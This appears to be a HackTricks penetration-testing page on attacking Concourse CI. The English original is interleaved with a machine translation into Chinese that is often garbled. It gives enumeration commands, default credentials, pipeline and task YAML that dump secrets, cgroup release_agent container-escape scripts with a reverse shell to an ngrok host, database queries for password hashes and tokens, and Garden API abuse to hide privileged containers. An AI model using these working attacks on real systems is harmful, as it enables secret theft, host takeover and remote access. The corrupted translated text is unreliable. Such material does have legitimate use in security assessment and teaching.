# Concourse Enumeration & Attacks

＃列举和攻击

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>

## User Roles & Permissions

Concourse comes with five roles:

大厅有五个角色：

* _Concourse_ **Admin**: This role is only given to owners of the **main team** (default initial concourse team). Admins can **configure other teams** (e.g.: `fly set-team`, `fly destroy-team`...). The permissions of this role cannot be affected by RBAC.

*_concourse_ ** admin **：此角色仅授予**主要团队的所有者**（默认初始会议团队）。 管理员可以**配置其他团队**（例如：`fly set-team'，``飞被摧毁团队''...）。 该角色的权限不受RBAC的影响。
* **owner**: Team owners can **modify everything within the team**.

***所有者**：团队所有者可以**修改团队中的所有内容**。
* **member**: Team members can **read and write** within the **teams assets** but cannot modify the team settings.

***成员**：团队成员可以**在**团队资产中读写** **，但无法修改团队设置。
* **pipeline-operator**: Pipeline operators can perform **pipeline operations** such as triggering builds and pinning resources, however they cannot update pipeline configurations.

***管道操作员**：管道操作员可以执行**管道操作**，例如触发构建和固定资源，但是他们无法更新管道配置。
* **viewer**: Team viewers have **"read-only" access to a team** and its pipelines.

***观众**：团队观众**“只读”访问团队**及其管道。

{% hint style="info" %}

{％提示样式=“ info”％}
Moreover, the **permissions of the roles owner, member, pipeline-operator and viewer can be modified** configuring RBAC (configuring more specifically it's actions). Read more about it in: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)

此外，可以修改角色所有者，成员，管道操作员和查看器的**权限**配置RBAC（更具体地配置其操作）。 在以下内容中阅读有关它的更多信息：[https://concourse-ci.org/user-roles.html]（
{% endhint %}

Note that Concourse **groups pipelines inside Teams**. Therefore users belonging to a Team will be able to manage those pipelines and **several Teams** might exist. A user can belong to several Teams and have different permissions inside each of them.

请注意，Concourse **团队内部的管道**。 因此，属于团队的用户将能够管理这些管道，**可能存在几个团队**。 用户可以属于几个团队，并且每个团队都有不同的权限。

## Vars & Credential Manager

## vars＆凭据经理

In the YAML configs you can configure values using the syntax `((`_`source-name`_`:`_`secret-path`_`.`_`secret-field`_`))`.\

在YAML配置中，您可以使用语法`（（（（（_`source-name_'_'：`_` _`secret-path`_.
The **source-name is optional**, and if omitted, the [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) will be used, or the value may be provided [statically](https://concourse-ci.org/vars.html#static-vars).\

** source-name是可选的**，如果省略，将使用[cluster wide corterential manager]（https://concourse-ci.org/vars.html#cluster-wide-credential-manager） 或可以提供该值[静态]（https://concourse-ci.org/vars.html#static-vars）。
The **optional \_secret-field**\_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\

**可选\ _ secret-field ** \ _指定读取的秘密上的字段。 如果省略，凭据管理器可以选择从所述凭据中读取“默认字段”，如果该字段存在。\ \ \ \
Moreover, the _**secret-path**_ and _**secret-field**_ may be surrounded by double quotes `"..."` if they **contain special characters** like `.` and `:`. For instance, `((source:"my.secret"."field:1"))` will set the _secret-path_ to `my.secret` and the _secret-field_ to `field:1`.

此外，_ ** secret-path ** _ and _ ** secret-field ** _可能被双引号包围``...“ ：`。 例如，`（（source：“ my.secret”。“ field：1”））`将把_secret-path_设置为`my.secret`和_secret-field_ to` field：field：1`。

### Static Vars

###静态vars

Static vars can be specified in **tasks steps**:

可以在**任务步骤**中指定静态vars：

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Or using the following `fly` **arguments**:

或使用以下“ fly” **参数**：

* `-v` or `--var` `NAME=VALUE` sets the string `VALUE` as the value for the var `NAME`.

*`-v`或`-var`名称=值'将字符串`值设置为var`名称的值。
* `-y` or `--yaml-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the var `NAME`.

*``-y`或`-yaml-var`名称= value` parses'value`为yaml，并将其设置为var`name'的值。
* `-i` or `--instance-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the instance var `NAME`. See [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) to learn more about instance vars.

*``-i`或``` -  instance-var`名称= value` parses'value`为yaml''，并将其设置为实例var`name'的值。 请参阅[分组管道]（https://concourse-ci.org/instanced-pipelines.html），以了解有关实例vars的更多信息。
* `-l` or `--load-vars-from` `FILE` loads `FILE`, a YAML document containing mapping var names to values, and sets them all.

*``-l`或`-lolad-load-vars-from`文件加载`files'，一个包含映射var名称的yaml文档，并将其设置为全部。

### Credential Management

There are different ways a **Credential Manager can be specified** in a pipeline, read how in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\

可以在管道中指定**凭证管理器的方式不同，请阅读如何在[https://concourse-ci.org/creds.html]中使用 ）。\
Moreover, Concourse supports different credential managers:

此外，Concourse支持不同的凭证经理：

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)

* [Vault凭据管理器]（https://concourse-ci.org/vault-credential-manager.html）
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)

* [credhub凭据经理]（https://concourse-ci.org/credhub-credential-manager.html）
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)

* [AWS SSM凭据管理器]（https://concourse-ci.org/aws-ssm-credential-manager.html）
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)

* [AWS Secrets Manager凭证经理]（https://concourse-ci.org/aws-asm-credential-manager.html）
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)

* [conjur凭证经理]（https://concourse-ci.org/conjur-credential-manager.html）
* [Caching credentials](https://concourse-ci.org/creds-caching.html)

* [CACHING凭据]（https://concourse-ci.org/creds-caching.html）
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)

* [删除凭据]（https://concourse-ci.org/creds-redacting.html）
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

* [重试失败的提取]（https://concourse-ci.org/creds-retry-logic.html）

{% hint style="danger" %}
Note that if you have some kind of **write access to Concourse** you can create jobs to **exfiltrate those secrets** as Concourse needs to be able to access them.

请注意，如果您有某种**写入会议访问权限**，则可以创建作业来**剥夺这些秘密**，因为大厅需要能够访问它们。
{% endhint %}

## Concourse Enumeration

##会议枚举

In order to enumerate a concourse environment you first need to **gather valid credentials** or to find an **authenticated token** probably in a `.flyrc` config file.

为了列举一个会议环境，您首先需要**收集有效的凭据**或在“ .flyrc”配置文件中找到**身份验证的令牌**。

### Login and Current User enum

###登录和当前用户枚举

* To login you need to know the **endpoint**, the **team name** (default is `main`) and a **team the user belongs to**:

*要登录，您需要知道**端点**，**团队名称**（默认为`main'）和一个用户属于**的**团队：
  * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`

*`fly-target示例登录-name my-team -concourse-url https：//ci.example.com [ -  insecure] [ -  client-cert =。/path-client-key =。/路径]
* Get configured **targets**:

*获得配置**目标**：
  * `fly targets`
* Get if the configured **target connection** is still **valid**:

*如果已配置的**目标连接**仍然**有效**：获取**：
  * `fly -t <target> status`
* Get **role** of the user against the indicated target:

*获得**的角色**针对所指示的目标：
  * `fly -t <target> userinfo`

  * `fly -t <target> userinfo`

### Teams & Users

###团队和用户

* Get a list of the Teams

*获取团队清单
  * `fly -t <target> teams`

*`fly -t <Target>团队
* Get roles inside team

*在团队中扮演角色
  * `fly -t <target> get-team -n <team-name>`

*`fly -t <Target> Get -Team -N <Team -Name>``
* Get a list of users

*获取用户列表
  * `fly -t <target> active-users`

*`fly -t <Target> Active -Users

### Pipelines

* **List** pipelines:
  * `fly -t <target> pipelines -a`

*`fly -t <Target>管道-A`
* **Get** pipeline yaml (**sensitive information** might be found in the definition):

***获取**管道yaml（**敏感信息**可能在定义中找到）：
  * `fly -t <target> get-pipeline -p <pipeline-name>`
* Get all pipeline **config declared vars**
  * `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Get all the **pipelines secret names used** (if you can create/modify a job or hijack a container you could exfiltrate them):

*获取所有使用的**管道秘密名称**（如果您可以创建/修改作业或劫持一个容器，则可以删除它们）：

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do 
    echo $pipename;
    fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
    echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

### Containers & Workers

###容器和工人

* List **workers**:
  * `fly -t <target> workers`

*`fly -t <Target>工人
* List **containers**:
  * `fly -t <target> containers`

*`fly -t <Target>容器
* List **builds** (to see what is running):

*列表**构建**（查看正在运行的内容）：
  * `fly -t <target> builds`

*`fly -t <Target>构建

## Concourse Attacks

##会议攻击

### Credentials Brute-Force

###凭证蛮力

* admin:admin
* test:test

### Secrets and params enumeration

###秘密和参数枚举

In the previous section we saw how you can **get all the secrets names and vars** used by the pipeline. The **vars might contain sensitive info** and the name of the **secrets will be useful later to try to steal** them.

在上一节中，我们看到了如何**获取管道使用的所有秘密名称和vars **。 ** vars可能包含敏感信息**，并且**秘密的名称以后将很有用，以窃取**。

### Session inside running or recently run container

###会话内部运行或最近运行的容器

If you have enough privileges (**member role or more**) you will be able to **list pipelines and roles** and just get a **session inside** the `<pipeline>/<job>` **container** using:

如果您有足够的特权（**成员角色或更多**），您将能够**列出管道和角色**，然后在**内部获得**会话。 容器**使用：

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

With these permissions you might be able to:

有了这些权限，您可能可以：

* **Steal the secrets** inside the **container**

***偷秘密** **容器内**
* Try to **escape** to the node

*尝试**逃脱**到节点
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node, if possible)

*枚举/滥用**云元数据**端点（如果可能的话，来自吊舱和节点）

### Pipeline Creation/Modification

If you have enough privileges (**member role or more**) you will be able to **create/modify new pipelines.** Check this example:

如果您有足够的特权（**成员角色或更多**），则可以**创建/修改新管道。**检查此示例：

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

With the **modification/creation** of a new pipeline you will be able to:

使用新管道的**修改/创建**，您将能够：

* **Steal** the **secrets** (via echoing them out or getting inside the container and running `env`)

***窃取** **秘密**（通过回声或进入容器中并运行`emb'）
* **Escape** to the **node** (by giving you enough privileges - `privileged: true`)

***逃脱**到**节点**（通过赋予您足够的特权 - `特权：true`）
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)

*枚举/滥用**云元数据**端点（来自吊舱和节点）
* **Delete** created pipeline

### Execute Custom Task

This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):

这类似于以前的方法，但是您可以**可以**执行自定义任务**（这可能会更** stealthier **）：

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escaping to the node from privileged task

###从特权任务中逃到节点

In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".

在前面的部分中，我们看到了如何**通过Concourse执行特权任务**。 这不会使容器与Docker容器中的特权标志完全相同。 例如，您不会在 /dev中看到节点文件系统设备，因此逃脱可能更“复杂”。

In the following PoC we are going to use the release\_agent to escape with some small modifications:

在以下POC中，我们将使用版本\ _agent进行一些小的修改：

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

# The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

# Then next part I think is constant "hostpath-provisioner/default/"

# For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

# The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}

{％提示样式=“警告”％}
As you might have noticed this is just a [**regular release\_agent escape**](../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged) just modifying the path of the cmd in the node

您可能已经注意到，这只是[**常规版本\ _agent Escape **]（../../ linux-hardening/privilege-eScalation/docker-breakout/docker-break-break-breakout-privilege-privilege-privilege-scalation/＃privilegenged） 只是修改节点中的CMD路径
{% endhint %}

### Escaping to the node from a Worker container

###从工人容器中逃到节点

A regular release\_agent escape with a minor modification is enough for this:

常规版本\ _agent Escape进行次要修改就足够了：

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

### Escaping to the node from the Web container

###从Web容器逃到节点

Even if the web container has some defenses disabled it's **not running as a common privileged container** (for example, you **cannot** **mount** and the **capabilities** are very **limited**, so all the easy ways to escape from the container are useless).

即使Web容器有某些防御措施禁用了一些防御，它也没有作为普通特权容器**运行（例如，您**无法** ** **安装**和**功能**非常**有限** ** ，因此从容器中逃脱的所有简单方法都是没有用的）。

However, it stores **local credentials in clear text**:

但是，它在清晰的文本中存储**本地凭据**：

```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```

You cloud use that credentials to **login against the web server** and **create a privileged container and escape to the node**.

您可以使用该凭据来**登录Web服务器**，并且**创建一个特权容器，然后逃脱到节点**。

In the environment you can also find information to **access the postgresql** instance that concourse uses (address, **username**, **password** and database among other info):

在环境中，您还可以找到信息来访问大厅使用的postgresql **实例（地址，**用户名**，**密码**和数据库等其他信息）：

```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```

### Abusing Garden Service - Not a real Attack

###滥用花园服务 - 不是真正的攻击

{% hint style="warning" %}

{％提示样式=“警告”％}
This are just some interesting notes about the service, but because it's only listening on localhost, this notes won't present any impact we haven't already exploited before

这只是有关该服务的一些有趣的笔记，但是由于它只是在Local主持的情况下听，所以该笔记不会给我们以前尚未利用任何影响
{% endhint %}

By default each concourse worker will be running a [**Garden**](https://github.com/cloudfoundry/garden) service in port 7777. This service is used by the Web master to indicate the worker **what he needs to execute** (download the image and run each task). This sound pretty good for an attacker, but there are some nice protections:

默认情况下，每个大厅工人将在港口7777中运行[** garden **]（https://github.com/cloudfoundry/garden）服务。网络主人使用此服务来指示工作人员** 需要执行**（下载图像并运行每个任务）。 对于攻击者来说，这听起来不错，但是有一些不错的保护：

* It's just **exposed locally** (127..0.0.1) and I think when the worker authenticates agains the Web with the special SSH service, a tunnel is created so the web server can **talk to each Garden service** inside each worker.

*只是**在本地暴露**（127..0.0.1），我认为当工人通过特殊的SSH服务再次验证网络时，创建了一个隧道，以便Web服务器可以**与每个Garden Service交谈*** *每个工人内部。
* The web server is **monitoring the running containers every few seconds**, and **unexpected** containers are **deleted**. So if you want to **run a custom container** you need to **tamper** with the **communication** between the web server and the garden service.

*Web服务器每隔几秒钟监视运行容器**，并且**意外**已删除** **。 因此，如果您想**运行自定义容器**，则需要**篡改**与Web服务器和花园服务之间的**通信**。

Concourse workers run with high container privileges:

Concourse工人以高容器特权运行：

```
Container Runtime: docker
Has Namespaces:
	pid: true
	user: false
AppArmor Profile: kernel
Capabilities:
	BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```

However, techniques like **mounting** the /dev device of the node or release\_agent **won't work** (as the real device with the filesystem of the node isn't accesible, only a virtual one). We cannot access processes of the node, so escaping from the node without kernel exploits get complicated.

但是，诸如**安装**节点的 /dev设备之类的技术或版本\ _agent **无法使用**（因为带有节点的文件系统的真实设备不可吸引，只有一个虚拟的设备）。 我们无法访问节点的过程，因此在没有内核漏洞的情况下从节点逃脱会变得复杂。

{% hint style="info" %}

{％提示样式=“ info”％}
In the previous section we saw how to escape from a privileged container, so if we can **execute** commands in a **privileged container** created by the **current** **worker**, we could **escape to the node**.

在上一节中，我们看到了如何逃离特权容器，因此，如果我们可以在**特权容器中执行**命令**由** Current ** **工人**创建的**，我们可以** 逃到节点**。
{% endhint %}

Note that playing with concourse I noted that when a new container is spawned to run something, the container processes are accessible from the worker container, so it's like a container creating a new container inside of it.

请注意，与Concourse一起玩，我注意到，当催生新容器以运行某些东西时，可以从Worker容器中访问容器过程，因此就像一个容器一样，在其中创建了一个新的容器。

#### Getting inside a running privileged container

####进入运行的特权容器

```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
# In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
  
# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```

#### Creating a new privileged container

####创建一个新的特权容器

You can very easily create a new container (just run a random UID) and execute something on it:

您可以非常轻松地创建一个新容器（只需运行一个随机UID）并在其上执行某些内容：

```bash
curl -X POST http://127.0.0.1:7777/containers \
   -H 'Content-Type: application/json' \
   -d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
  --header='Content-Type:application/json' \
  'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```

However, the web server is checking every few seconds the containers that are running, and if an unexpected one is discovered, it will be deleted. As the communication is occurring in HTTP, you could tamper the communication to avoid the deletion of unexpected containers:

但是，Web服务器每隔几秒钟检查运行的容器，如果发现了一个意外的容器，将会删除它。 随着HTTP中的通信发生，您可以篡改通信以避免删除意外容器：

```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>
